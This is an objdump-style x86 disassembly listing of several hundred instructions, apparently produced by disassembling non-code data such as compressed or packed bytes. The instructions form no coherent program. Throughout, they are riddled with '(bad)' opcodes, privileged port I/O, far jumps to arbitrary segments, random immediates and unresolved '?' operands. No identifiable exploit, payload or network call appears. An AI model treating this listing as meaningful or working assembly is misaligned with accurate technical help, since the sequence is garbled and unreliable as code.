  41dbfa:	in     eax,0xfc
  41dbfc:	jmp    0x96b8:0xa3a2443c
  41dc03:	mov    dl,0xd5
  41dc05:	sbb    al,0xdf
  41dc07:	mov    ds:0xd673b5c9,al
  41dc0c:	out    0xca,al
  41dc0e:	and    BYTE PTR [edi+0x7c],al
	...
  41dc74:	outs   dx,DWORD PTR ds:[esi]
  41dc75:	retf   0x9815
  41dc78:	mov    ch,0xdf
  41dc7a:	out    dx,eax
  41dc7b:	jmp    DWORD PTR [edi+0x6fb0d050]
  41dc81:	jle    0x41dc5d
  41dc83:	shr    cl,cl
  41dc85:	cmp    al,0x1
  41dc87:	add    BYTE PTR ds:0xca000001,al
  41dc8d:	inc    edi
  41dc8e:	sahf   
  41dc8f:	mov    esi,0x7dfab0cd
  41dc94:	or     cl,BYTE PTR [edx]
  41dc96:	aam    0xb6
  41dc98:	push   edi
  41dc99:	dec    ecx
  41dc9a:	(bad)
  41dc9e:	or     DWORD PTR [esi-0x36fdede],ebx
  41dca4:	std    
  41dca5:	cmc    
  41dca6:	je     0x41dcb9
  41dca8:	cmp    BYTE PTR [ebx+0x35db579e],ah
  41dcae:	jmp    0x3913:0x320a1281
  41dcb5:	sub    edi,eax
  41dcb7:	sti    
  41dcb8:	mov    ah,0xae
  41dcba:	xchg   DWORD PTR [ebx+0x885d727],ebx
  41dcc0:	icebp  
  41dcc1:	and    edi,DWORD PTR [eax]
  41dcc3:	xor    dh,BYTE PTR [ecx+0x20]
  41dcc6:	mov    ebx,?
  41dcc8:	cdq    
  41dcc9:	jmp    0x10fb4371
  41dcce:	pop    ebp
  41dccf:	push   es
  41dcd0:	ret    
  41dcd1:	mov    edx,0xe1fda1e2
  41dcd6:	adc    DWORD PTR [ebx],0x591baaf5
  41dcdc:	push   es
  41dcdd:	mov    BYTE PTR [eax-0x38a13287],bh
  41dce3:	xchg   esp,eax
  41dce4:	popa   
  41dce5:	aas    
  41dce6:	out    dx,eax
  41dce7:	jne    0x41dd15
  41dce9:	sbb    ah,BYTE PTR [edx+eiz*8-0x52]
  41dced:	xor    ecx,ebp
  41dcef:	addr16 mov ecx,0x5fa5b970
  41dcf5:	jmp    0x589e5dda
  41dcfa:	repz push ebx
  41dcfc:	mov    esp,0x2e93b7c5
  41dd01:	or     ax,0x4411
  41dd05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd06:	mov    BYTE PTR [ecx],dl
  41dd08:	xchg   esp,eax
  41dd09:	add    eax,0xe67031be
  41dd0e:	lahf   
  41dd0f:	pushf  
  41dd10:	jbe    0x41dd90
  41dd12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd13:	mov    ch,0x80
  41dd15:	sbb    eax,DWORD PTR [ebp+0x32]
  41dd18:	xor    dl,bl
  41dd1a:	mov    bl,0x6b
  41dd1c:	out    dx,al
  41dd1d:	add    DWORD PTR [ebx],edx
  41dd1f:	pop    edx
  41dd20:	and    eax,0x9820adc4
  41dd25:	popa   
  41dd26:	jmp    0x41dd2a
  41dd28:	sbb    BYTE PTR [ecx+ecx*4-0x3c],cl
  41dd2c:	les    edx,FWORD PTR [esi-0x18]
  41dd2f:	pop    ebp
  41dd30:	and    bh,BYTE PTR [edx+0x757dff1b]
  41dd36:	and    ebx,DWORD PTR [ebp-0x34]
  41dd39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd3a:	loope  0x41dd0a
  41dd3c:	mov    ecx,DWORD PTR [ebx-0x70]
  41dd3f:	dec    ebp
  41dd40:	mov    cl,0xf7
  41dd42:	loope  0x41dcca
  41dd44:	sbb    edx,edi
  41dd46:	mov    ecx,0x4d7c679e
  41dd4b:	push   es
  41dd4c:	rcl    BYTE PTR [ecx-0x74],cl
  41dd4f:	(bad)  
  41dd50:	in     al,dx
  41dd51:	sbb    eax,0x93983994
  41dd56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd57:	lock sbb al,0xcc
  41dd5a:	stc    
  41dd5b:	scas   al,BYTE PTR es:[edi]
  41dd5c:	(bad)  
  41dd5d:	and    edi,edx
  41dd5f:	sub    eax,0xeeffb5e3
  41dd64:	mov    ch,0xcf
  41dd66:	inc    DWORD PTR [edx]
  41dd68:	add    al,0x41
  41dd6a:	xor    bh,cl
  41dd6c:	sbb    DWORD PTR [ebx],esp
  41dd6e:	push   es
  41dd6f:	xor    eax,0x531c3927
  41dd74:	mov    al,ds:0x56311009
  41dd79:	stc    
  41dd7a:	bound  ebx,QWORD PTR [ebx]
  41dd7c:	in     al,dx
  41dd7d:	push   esp
  41dd7e:	imul   ebp,DWORD PTR [ecx+0x57],0x1f
  41dd82:	xchg   BYTE PTR [edx],bh
  41dd84:	loope  0x41ddc3
  41dd86:	daa    
  41dd87:	jp     0x41dd6a
  41dd89:	dec    edx
  41dd8a:	mov    bh,BYTE PTR [ecx+0x6e024c69]
  41dd90:	jns    0x41dd92
	...
  41ddf2:	add    BYTE PTR [eax],al
  41ddf4:	and    bl,dh
  41ddf6:	das    
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	mov    esp,0xeefb2225
  41de05:	cmp    eax,0x1050001
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	out    0x1b,eax
  41de0e:	les    ebx,FWORD PTR [edi+0x77]
  41de11:	xor    BYTE PTR [eax],cl
  41de13:	xchg   ebp,eax
  41de14:	imul   ecx
  41de16:	and    al,al
  41de18:	jl     0x41de2f
  41de1a:	stos   DWORD PTR es:[edi],eax
  41de1b:	push   edx
  41de1c:	sub    al,0xae
  41de1e:	jne    0x41dda7
  41de20:	sub    ah,BYTE PTR [ebx]
  41de22:	jmp    0x41de11
  41de24:	in     al,dx
  41de25:	pushf  
  41de26:	pop    ebx
  41de27:	mov    dl,BYTE PTR [edi+0x27]
  41de2a:	jne    0x41de7e
  41de2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de2d:	enter  0x6fb5,0x64
  41de31:	fbstp  TBYTE PTR [edi]
  41de33:	pop    ebp
  41de34:	jno    0x41ddf1
  41de36:	scas   al,BYTE PTR es:[edi]
  41de37:	dec    esp
  41de38:	std    
  41de39:	fiadd  DWORD PTR [eax+0x1b]
  41de3c:	sub    DWORD PTR [esi+ebx*4-0x55],ecx
  41de40:	fwait
  41de41:	add    al,0xb8
  41de43:	sti    
  41de44:	xchg   al,bh
  41de46:	sbb    esi,DWORD PTR [edx+0x2d]
  41de49:	pop    ebx
  41de4a:	and    ebp,DWORD PTR [edx]
  41de4c:	in     eax,0x36
  41de4e:	dec    edi
  41de4f:	addr16 call 0x1608:0xe57f1a81
  41de57:	inc    eax
  41de58:	aam    0x4f
  41de5a:	push   es
  41de5b:	out    dx,eax
  41de5c:	lea    ebp,[ebx+0x47acb90e]
  41de62:	(bad)  
  41de63:	cmp    al,0x6d
  41de65:	jno    0x41ded3
  41de67:	scas   al,BYTE PTR es:[edi]
  41de68:	and    eax,0xe25d4876
  41de6d:	scas   eax,DWORD PTR es:[edi]
  41de6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de6f:	mov    cl,0x31
  41de71:	mov    eax,0xde08367f
  41de76:	ja     0x41ded7
  41de78:	push   ebp
  41de79:	cmp    eax,0x71693e92
  41de7e:	pop    ebp
  41de7f:	popf   
  41de80:	mov    cl,0x9c
  41de82:	mov    ds:0x446a15c9,al
  41de87:	pop    es
  41de88:	ret    0x8f0e
  41de8b:	pop    ss
  41de8c:	dec    ebp
  41de8d:	or     bh,BYTE PTR [edx+eiz*4+0x5cd6c2bc]
  41de94:	dec    esp
  41de95:	(bad)  
  41de96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de97:	cmp    DWORD PTR [edx+0x5d568737],eax
  41de9d:	cli    
  41de9e:	mov    ah,0xe9
  41dea0:	push   cs
  41dea1:	inc    edi
  41dea2:	stc    
  41dea3:	fwait
  41dea4:	call   0xba82:0x67e26e7a
  41deab:	xchg   edi,eax
  41deac:	rol    BYTE PTR [ecx-0x3436b693],cl
  41deb2:	and    edx,esp
  41deb4:	mov    dh,0xc7
  41deb6:	int    0x1e
  41deb8:	add    esi,DWORD PTR [ecx+0x69]
  41debb:	ror    DWORD PTR [ebp+0x3843f218],1
  41dec1:	test   DWORD PTR [ebx+edi*4-0x7eb0ed9e],edx
  41dec8:	scas   al,BYTE PTR es:[edi]
  41dec9:	call   0x9832:0xec44b3f0
  41ded0:	ret    
  41ded1:	stos   BYTE PTR es:[edi],al
  41ded2:	add    BYTE PTR [ebx-0x58f5c197],bh
  41ded8:	out    0xa4,eax
  41deda:	popa   
  41dedb:	mov    ah,0x4c
  41dedd:	bound  eax,QWORD PTR [ecx]
  41dedf:	mov    eax,ds:0x7325812
  41dee4:	into   
  41dee5:	in     al,0xeb
  41dee7:	dec    ebx
  41dee8:	mov    al,ds:0x6741dca6
  41deed:	sbb    edx,ecx
  41deef:	out    0xaf,eax
  41def1:	xchg   edi,eax
  41def2:	in     eax,dx
  41def3:	mov    WORD PTR [ebp+0x56],ss
  41def6:	adc    BYTE PTR [ebp-0x59],ch
  41def9:	mov    al,0xee
  41defb:	sbb    BYTE PTR [edx+edx*4-0x45603aa],ch
  41df02:	sub    DWORD PTR [edx-0x3a],eax
  41df05:	es (bad) 
  41df07:	bound  edx,QWORD PTR [edx-0x4d0e920d]
  41df0d:	adc    eax,0xca0b84
	...
  41df72:	add    BYTE PTR [eax],al
  41df74:	aas    
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0xd9039ce9
  41df82:	and    al,0x7a
  41df84:	repz add DWORD PTR ds:[eax],eax
  41df88:	add    eax,0x7d000001
  41df8d:	nop
  41df8e:	add    DWORD PTR [ebx-0x34],edi
  41df91:	lods   eax,DWORD PTR ds:[esi]
  41df92:	repz cmp dh,BYTE PTR [eax+0x6ec78287]
  41df99:	mov    DWORD PTR [esi+0x75d1df9d],ebx
  41df9f:	add    dh,cl
  41dfa1:	xor    BYTE PTR [edx],cl
  41dfa3:	ss pop ds
  41dfa5:	or     esp,DWORD PTR [esi+0x69cc6ebf]
  41dfab:	fwait
  41dfac:	scas   al,BYTE PTR es:[edi]
  41dfad:	sbb    eax,0x28cc265
  41dfb2:	data16 arpl WORD PTR [ebp-0x3f0fa9],bx
  41dfb9:	test   BYTE PTR [eax*4+0x3e7e30cd],dh
  41dfc0:	and    BYTE PTR [ebx+0x140e7280],cl
  41dfc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfc7:	or     esp,ebx
  41dfc9:	add    BYTE PTR [edi],bl
  41dfcb:	or     BYTE PTR [ebx-0x7809f8ee],0x3c
  41dfd2:	ret    
  41dfd3:	scas   eax,DWORD PTR es:[edi]
  41dfd4:	ins    BYTE PTR es:[edi],dx
  41dfd5:	adc    DWORD PTR [eax-0x10],edx
  41dfd8:	mov    esi,eax
  41dfda:	pop    esi
  41dfdb:	adc    al,0x1e
  41dfdd:	cmc    
  41dfde:	js     0x41dfd7
  41dfe0:	adc    eax,0xf2fee9ff
  41dfe5:	in     eax,dx
  41dfe6:	scas   al,BYTE PTR es:[edi]
  41dfe7:	stos   BYTE PTR es:[edi],al
  41dfe8:	xor    ecx,DWORD PTR [eax+edx*8+0x48]
  41dfec:	xor    ebx,esi
  41dfee:	fisttp WORD PTR [edi-0x31f1f1cf]
  41dff4:	iret   
  41dff5:	xor    esi,DWORD PTR [ebp+0x20]
  41dff8:	or     eax,0xadde3609
  41dffd:	add    bl,BYTE PTR [ecx-0x6e]
  41e000:	les    edx,FWORD PTR [edx+0x50]
  41e003:	or     DWORD PTR [edx],esp
  41e005:	mov    dh,0xa0
  41e008:	fs push eax
  41e00a:	stos   BYTE PTR es:[edi],al
  41e00b:	test   BYTE PTR [edi],0xae
  41e00e:	stc    
  41e00f:	ror    DWORD PTR [edi+0x443a82af],cl
  41e015:	or     al,0x97
  41e017:	pop    edi
  41e018:	sbb    eax,esi
  41e01a:	add    bl,BYTE PTR [ebx+0x66803bcc]
  41e020:	jo     0x41e066
  41e022:	add    edx,DWORD PTR [esi]
  41e024:	or     al,0x35
  41e026:	fild   DWORD PTR ds:0x3d0ff46b
  41e02c:	dec    ebx
  41e02d:	jp     0x41dfca
  41e02f:	and    cl,BYTE PTR [edi]
  41e031:	outs   dx,DWORD PTR ds:[esi]
  41e032:	mov    DWORD PTR [eax+ebp*8],esp
  41e035:	lock add eax,DWORD PTR [ebx+0x6f27a6cc]
  41e03c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e03d:	xor    eax,0xb2022e08
  41e042:	leave  
  41e043:	mov    ah,0x5d
  41e045:	cmp    BYTE PTR [edx+edi*8-0x68],ah
  41e049:	mov    dl,0xc3
  41e04b:	ins    BYTE PTR es:[edi],dx
  41e04c:	popf   
  41e04d:	and    esi,ecx
  41e04f:	cmp    al,0x4
  41e051:	push   0xfe1e3f7d
  41e056:	add    ch,BYTE PTR [esi+0x7802e159]
  41e05c:	adc    DWORD PTR [edi-0x56e1748f],edx
  41e062:	dec    esp
  41e063:	xchg   DWORD PTR [ebx],edi
  41e065:	xchg   esi,eax
  41e066:	or     al,0xad
  41e068:	sbb    bh,BYTE PTR [ebp+0x176abc48]
  41e06e:	or     BYTE PTR [edi],cl
  41e070:	pop    ebp
  41e071:	test   BYTE PTR [ecx],cl
  41e073:	(bad)  
  41e074:	cmp    ebp,ebp
  41e076:	cmp    al,0x9c
  41e078:	jnp    0x41e0d1
  41e07a:	stos   DWORD PTR es:[edi],eax
  41e07b:	outs   dx,DWORD PTR ds:[esi]
  41e07c:	test   DWORD PTR [eax],ebx
  41e07e:	cmp    al,0x20
  41e080:	xor    BYTE PTR [ebp-0x1e],al
  41e083:	sbb    ecx,0x3b
  41e086:	fsubr  QWORD PTR [edx+0x1e]
  41e089:	inc    esi
  41e08a:	outs   dx,BYTE PTR ds:[esi]
  41e08b:	sub    BYTE PTR ds:[ecx+0x0],dl
  41e08f:	(bad)  
  41e090:	fld    QWORD PTR [eax]
	...
  41e0f2:	add    BYTE PTR [eax],al
  41e0f4:	dec    edi
  41e0f5:	push   ebx
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	dec    ebx
  41e101:	daa    
  41e102:	outs   dx,DWORD PTR ds:[esi]
  41e103:	jge    0x41e0fd
  41e105:	aas    
  41e106:	add    DWORD PTR [eax],eax
  41e108:	add    eax,0x92000001
  41e10d:	jmp    DWORD PTR [esi-0x15b75c5f]
  41e113:	xor    eax,0xbead9c8b
  41e118:	jae    0x41e0d9
  41e11a:	inc    eax
  41e11b:	mov    ds:0xde70dda,al
  41e120:	or     al,0x65
  41e122:	sub    dh,BYTE PTR [ecx-0x540173fd]
  41e128:	arpl   WORD PTR [ebp+0x5076a396],ax
  41e12e:	pop    edx
  41e12f:	ret    
  41e130:	mov    bl,0x15
  41e132:	add    BYTE PTR [ecx-0x76bcb9f],cl
  41e138:	fmul   QWORD PTR [esi+0x27]
  41e13b:	cmp    bh,bl
  41e13d:	push   edi
  41e13e:	fld    DWORD PTR [edx-0x7a260ada]
  41e144:	test   esp,esi
  41e146:	xchg   DWORD PTR [ecx+0x49986209],ebp
  41e14c:	mov    ecx,0x2547b73f
  41e151:	les    ebx,FWORD PTR [ecx-0x79]
  41e154:	xchg   DWORD PTR [ebx-0x713a0d7],edx
  41e15a:	daa    
  41e15b:	outs   dx,BYTE PTR ds:[esi]
  41e15c:	dec    edx
  41e15d:	dec    eax
  41e15e:	push   ds
  41e15f:	inc    edx
  41e160:	dec    esi
  41e161:	mov    ds:0x7447df4f,eax
  41e166:	leave  
  41e167:	jmp    0x41e14d
  41e169:	mov    eax,0x552e5923
  41e16e:	xor    DWORD PTR [ebx],ebx
  41e170:	(bad)  
  41e172:	ficomp DWORD PTR [ebx+eax*4]
  41e175:	mov    BYTE PTR [ebx-0x126cadad],ch
  41e17b:	or     DWORD PTR [edi],0x37629ff3
  41e181:	sbb    esi,ebp
  41e183:	push   es
  41e184:	int    0xe7
  41e186:	cmp    eax,0x1575b432
  41e18b:	ret    0x979c
  41e18e:	jns    0x41e1ae
  41e190:	pop    ebx
  41e191:	fdivr  st(5),st
  41e193:	dec    esi
  41e194:	mov    edi,0x52b5ec9e
  41e199:	pushf  
  41e19a:	mov    bh,BYTE PTR [esp+edx*4+0x3b]
  41e19e:	sbb    BYTE PTR [ebp-0x25],al
  41e1a1:	call   0xb9f4c3f0
  41e1a6:	test   BYTE PTR [edi+eiz*1+0x72486d1],ah
  41e1ad:	rcl    edi,cl
  41e1af:	ins    DWORD PTR es:[edi],dx
  41e1b0:	xchg   edi,eax
  41e1b1:	push   cs
  41e1b2:	xchg   BYTE PTR [edi],dh
  41e1b4:	test   DWORD PTR [ebp-0x5224f7b5],esp
  41e1ba:	fnstsw WORD PTR [esi+0x59]
  41e1bd:	adc    DWORD PTR [esi],0x5f
  41e1c0:	mov    eax,DWORD PTR [ebx]
  41e1c2:	inc    edx
  41e1c3:	mov    dh,0x38
  41e1c5:	inc    esp
  41e1c6:	test   BYTE PTR [ecx+0x1f794ecc],bh
  41e1cc:	enter  0x1eff,0x38
  41e1d0:	inc    ebp
  41e1d1:	mov    edi,0xba9f424a
  41e1d6:	clc    
  41e1d7:	loop   0x41e1af
  41e1d9:	ins    DWORD PTR es:[edi],dx
  41e1da:	fstp   DWORD PTR [edx-0x2]
  41e1dd:	xchg   esi,eax
  41e1de:	sub    al,0x6e
  41e1e0:	xor    bl,dh
  41e1e2:	fild   DWORD PTR fs:[edx]
  41e1e5:	or     edx,ebx
  41e1e7:	xchg   edi,esp
  41e1e9:	icebp  
  41e1ea:	outs   dx,DWORD PTR ds:[esi]
  41e1eb:	shl    DWORD PTR [edx+0x5e],0x5e
  41e1ef:	js     0x41e211
  41e1f1:	sbb    dl,dl
  41e1f3:	int3   
  41e1f4:	fsub   DWORD PTR [esi]
  41e1f6:	dec    ecx
  41e1f7:	xor    ebp,edi
  41e1f9:	ret    0x33c9
  41e1fc:	and    BYTE PTR [edx-0x5b867408],cl
  41e202:	jecxz  0x41e25a
  41e204:	cdq    
  41e205:	jo     0x41e1f2
  41e207:	dec    esi
  41e208:	(bad)  
  41e209:	adc    eax,0xc6bd7a63
  41e20e:	bound  esp,QWORD PTR [bx+si+0x0]
	...
  41e273:	add    BYTE PTR [ebx-0x1988fe],ch
  41e279:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e27f:	or     al,0x4d
  41e281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e282:	lea    esi,[ebx-0x3]
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    eax,0x8e000001
  41e28d:	or     DWORD PTR ds:0x5608b4fb,esi
  41e293:	dec    edx
  41e294:	cmp    DWORD PTR [ebx],0xffffffb3
  41e297:	cmp    al,0x5a
  41e299:	out    0x15,al
  41e29b:	fsub   st(1),st
  41e29d:	inc    edi
  41e29e:	ins    BYTE PTR es:[edi],dx
  41e29f:	mov    esi,0x7d5c193e
  41e2a4:	ins    DWORD PTR es:[edi],dx
  41e2a5:	(bad)  
  41e2a6:	mov    cl,0x55
  41e2a8:	push   esi
  41e2a9:	aaa    
  41e2aa:	inc    eax
  41e2ab:	jmp    0x41e2ae
  41e2ad:	ret    0xa467
  41e2b0:	xlat   BYTE PTR es:[ebx]
  41e2b2:	push   0xffffff9b
  41e2b4:	ins    BYTE PTR es:[edi],dx
  41e2b5:	test   BYTE PTR [edi+0x232faab1],cl
  41e2bb:	sub    eax,0x853f71a9
  41e2c0:	int3   
  41e2c1:	jge    0x41e24e
  41e2c3:	adc    edx,DWORD PTR [ebp+0x35]
  41e2c6:	je     0x41e275
  41e2c8:	imul   DWORD PTR [edi-0x432f84e9]
  41e2ce:	adc    al,dh
  41e2d0:	int3   
  41e2d1:	popf   
  41e2d2:	sub    ebp,DWORD PTR [ebx+0x46582b84]
  41e2d8:	iret   
  41e2d9:	cmp    al,0x91
  41e2db:	pop    esp
  41e2dc:	xor    ebp,edi
  41e2de:	adc    eax,0x904705c6
  41e2e3:	xchg   BYTE PTR [ecx+eiz*1-0x6a],ah
  41e2e7:	pop    es
  41e2e8:	add    al,0x24
  41e2ea:	mov    edx,ebx
  41e2ec:	push   esi
  41e2ed:	jp     0x41e34a
  41e2ef:	xchg   ebx,eax
  41e2f0:	adc    al,bl
  41e2f2:	dec    ebx
  41e2f3:	mov    ebx,0x20086be2
  41e2f8:	clc    
  41e2f9:	dec    eax
  41e2fa:	cmp    eax,0x5787881f
  41e2ff:	xchg   ebx,eax
  41e300:	mov    al,BYTE PTR ds:0x32cebf5e
  41e306:	push   ebp
  41e307:	push   0xfa15ab70
  41e30c:	jb     0x41e342
  41e30e:	cld    
  41e30f:	dec    ebx
  41e310:	and    al,0x59
  41e312:	xor    DWORD PTR [eax+0x183242e0],edi
  41e318:	and    DWORD PTR [ebp-0x64],edi
  41e31b:	jne    0x41e336
  41e31d:	mov    dh,ah
  41e31f:	test   BYTE PTR [ecx+0x3],dl
  41e322:	push   edx
  41e323:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e324:	les    ebp,FWORD PTR [edx+ebp*8+0x54a68e38]
  41e32b:	lahf   
  41e32c:	mov    ebp,0x24a77a33
  41e331:	dec    edx
  41e332:	adc    DWORD PTR [edx-0x38cc26b6],0x1a341656
  41e33c:	sbb    bl,BYTE PTR [edi]
  41e33e:	inc    esi
  41e33f:	ss (bad) 
  41e341:	imul   ecx,ecx,0x49
  41e344:	sbb    al,cl
  41e346:	rcr    edx,1
  41e348:	sub    dl,BYTE PTR [ecx-0x2bdc90bb]
  41e34e:	leave  
  41e34f:	mov    dh,0xbe
  41e351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e352:	xor    ebx,DWORD PTR [ebx+0x19f510f7]
  41e358:	gs xchg edx,eax
  41e35a:	dec    ecx
  41e35b:	iret   
  41e35c:	mov    al,ds:0x4fcf0520
  41e361:	mov    ecx,?
  41e363:	inc    eax
  41e364:	aam    0xc4
  41e366:	sub    ch,BYTE PTR [eax+0x7aaf62e0]
  41e36c:	sbb    al,0xb5
  41e36e:	into   
  41e36f:	add    ch,BYTE PTR [ecx+ecx*2+0x9afa9dc]
  41e376:	inc    eax
  41e377:	jbe    0x41e3c4
  41e379:	pop    ecx
  41e37a:	test   al,0x94
  41e37c:	hlt    
  41e37d:	in     al,dx
  41e37e:	adc    dl,BYTE PTR [edx-0x3e]
  41e381:	jp     0x41e394
  41e383:	pop    edx
  41e384:	(bad)  
  41e385:	sbb    BYTE PTR [ebp+0x35],ah
  41e388:	dec    ebx
  41e389:	lea    eax,[ebp+0x17d90ec3]
  41e38f:	gs push ss
	...
  41e3f1:	add    BYTE PTR [eax],al
  41e3f3:	add    BYTE PTR [ecx-0xe088ee],cl
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x8573c409
  41e403:	lahf   
  41e404:	add    al,BYTE PTR [edx+0x1]
  41e407:	add    BYTE PTR ds:0x97000001,al
  41e40d:	mov    ch,BYTE PTR [edi-0x1286bc95]
  41e413:	in     al,0x28
  41e415:	addr16 pusha 
  41e417:	fnstsw WORD PTR [edx-0x15922d6d]
  41e41d:	rcl    DWORD PTR [edi],0xc4
  41e420:	cli    
  41e421:	mov    WORD PTR [edi-0x6c081a1f],?
  41e427:	pop    ds
  41e428:	push   ds
  41e429:	add    esi,esp
  41e42b:	xor    dl,BYTE PTR [edx+0x21]
  41e42e:	or     eax,0x8b74c73c
  41e433:	jge    0x41e3dd
  41e435:	push   cs
  41e436:	and    eax,0xdee59b66
  41e43b:	sbb    DWORD PTR [edi+ebx*2-0x422f4212],eax
  41e442:	pop    ss
  41e443:	dec    eax
  41e444:	mov    WORD PTR [ebx],fs
  41e446:	test   BYTE PTR [edi],al
  41e448:	les    edi,FWORD PTR [ebx]
  41e44a:	sbb    BYTE PTR [ecx+0x23],bh
  41e44d:	pop    esi
  41e44e:	les    esi,FWORD PTR [ebp-0x40e7e580]
  41e454:	lock dec esp
  41e456:	pop    eax
  41e457:	jp     0x41e47b
  41e459:	pop    ebx
  41e45a:	pop    esi
  41e45b:	repz xor dl,cl
  41e45e:	dec    ecx
  41e45f:	inc    ebp
  41e460:	pop    eax
  41e461:	lock jmp 0x15ba:0xe04bc317
  41e469:	jecxz  0x41e473
  41e46b:	jnp    0x41e4e8
  41e46d:	pushf  
  41e46e:	mov    ds:0x4de9f2,al
  41e473:	cs jg  0x41e499
  41e476:	xchg   ebp,eax
  41e477:	sub    bl,bh
  41e479:	or     ch,al
  41e47b:	arpl   WORD PTR fs:[edi+0x55c51bb1],ax
  41e482:	push   ss
  41e483:	jmp    0x1172:0x1fd0f6b8
  41e48a:	sbb    eax,DWORD PTR [esp+eax*2+0x53119eaa]
  41e491:	fsubr  DWORD PTR ds:0xa0f626a2
  41e497:	xchg   ecx,eax
  41e498:	paddw  mm2,mm6
  41e49b:	stos   DWORD PTR es:[edi],eax
  41e49c:	std    
  41e49d:	pop    ecx
  41e49e:	in     al,dx
  41e49f:	adc    BYTE PTR [ebx-0x73ac5f97],ah
  41e4a5:	mov    bh,0x62
  41e4a7:	sub    BYTE PTR [esp+esi*4],ch
  41e4aa:	push   eax
  41e4ab:	dec    edx
  41e4ac:	or     BYTE PTR [ecx+ecx*8+0x533780b0],ah
  41e4b3:	cmp    al,0x4c
  41e4b5:	js     0x41e453
  41e4b7:	lods   eax,DWORD PTR ds:[esi]
  41e4b8:	add    esp,esp
  41e4ba:	mov    ?,edi
  41e4bc:	fbld   TBYTE PTR [ebx+0x67]
  41e4bf:	jecxz  0x41e535
  41e4c1:	jbe    0x41e4ec
  41e4c3:	pushf  
  41e4c4:	push   esi
  41e4c5:	jae    0x41e532
  41e4c7:	dec    ebp
  41e4c8:	cmp    ebx,DWORD PTR [esi]
  41e4ca:	lods   al,BYTE PTR ds:[esi]
  41e4cb:	das    
  41e4cc:	int    0x27
  41e4ce:	jge    0x41e51a
  41e4d0:	or     al,0x27
  41e4d2:	cwde   
  41e4d3:	and    esi,DWORD PTR [ecx]
  41e4d5:	call   DWORD PTR [ebx+eax*2+0x590e3ff3]
  41e4dc:	sub    dl,bh
  41e4de:	test   BYTE PTR [eax],0xbc
  41e4e1:	mov    ds:0x810667b7,eax
  41e4e6:	cdq    
  41e4e7:	add    edi,edi
  41e4e9:	xor    BYTE PTR [ebx-0x4bda76ea],ch
  41e4ef:	dec    esp
  41e4f0:	dec    ebx
  41e4f1:	push   es
  41e4f2:	adc    ah,BYTE PTR [eax+edx*2]
  41e4f5:	test   eax,0x618c6dce
  41e4fa:	mov    dl,0xd3
  41e4fc:	jae    0x41e4c8
  41e4fe:	sbb    al,0xc3
  41e500:	lock outs dx,BYTE PTR ds:[esi]
  41e502:	adc    BYTE PTR [ecx],al
  41e504:	cs push esp
  41e506:	adc    eax,0xb6ef4e5d
  41e50b:	addr16 ja 0xbcd24c
	...
  41e572:	add    BYTE PTR [eax],al
  41e574:	and    BYTE PTR [edx-0x35],ch
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e562
  41e581:	jns    0x41e532
  41e583:	out    dx,eax
  41e584:	pop    es
  41e585:	inc    ebx
  41e586:	add    DWORD PTR [eax],eax
  41e588:	add    eax,0xaf000001
  41e58d:	ja     0x41e54b
  41e58f:	mov    ?,WORD PTR [edi]
  41e591:	jle    0x41e5ef
  41e593:	add    edi,DWORD PTR [esi-0x5cce5de8]
  41e599:	sub    ax,0x4959
  41e59d:	cwde   
  41e59e:	cmp    esi,DWORD PTR [edx-0x197aff0a]
  41e5a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5a5:	popf   
  41e5a6:	and    cl,bl
  41e5a8:	pop    edx
  41e5a9:	pusha  
  41e5aa:	outs   dx,BYTE PTR ds:[esi]
  41e5ab:	outs   dx,BYTE PTR ds:[esi]
  41e5ac:	mulps  xmm3,XMMWORD PTR [eax-0x40]
  41e5b0:	shr    BYTE PTR [esp+eax*8-0x4921f59c],1
  41e5b7:	mov    BYTE PTR [ebx+ebx*8-0x1f],dh
  41e5bb:	dec    esp
  41e5bc:	outs   dx,DWORD PTR ds:[esi]
  41e5bd:	xchg   DWORD PTR [esi-0x7e7a5c7b],edx
  41e5c3:	xchg   ecx,eax
  41e5c4:	or     dh,bl
  41e5c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5c7:	add    al,al
  41e5c9:	sti    
  41e5ca:	xchg   ebx,eax
  41e5cb:	aam    0xeb
  41e5cd:	or     eax,0x14e91b10
  41e5d2:	shl    BYTE PTR [esi-0x5e],cl
  41e5d5:	sar    DWORD PTR [edx+0x7d],0x3d
  41e5d9:	out    0x4,al
  41e5db:	sbb    eax,0x32bb9763
  41e5e0:	mov    eax,ds:0xacc96087
  41e5e5:	mov    cl,0xb0
  41e5e7:	cmp    esi,ecx
  41e5e9:	sub    edx,ebx
  41e5eb:	(bad)  
  41e5ec:	mov    ?,WORD PTR [ebp-0x7a]
  41e5ef:	lds    eax,FWORD PTR [eax-0x1f]
  41e5f2:	and    DWORD PTR [ebx],esp
